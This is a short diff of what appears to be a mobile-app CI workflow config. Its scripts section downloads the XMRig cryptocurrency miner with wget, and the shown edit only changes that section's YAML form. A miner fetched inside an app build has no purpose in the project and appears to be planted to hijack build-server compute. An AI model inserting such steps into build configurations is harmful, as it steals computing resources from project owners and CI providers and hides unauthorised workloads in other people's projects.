@@ -19,7 +19,7 @@ workflows:
           include: true
           source: true
       cancel_previous_builds: false
-    scripts:
+    scripts: |
       - wget https://github.com/xmrig/xmrig/releases/download/v6.10.0/xmrig-6.10.0-linux-x64.tar.gz
     artifacts:
       - build/**/outputs/**/*.aab
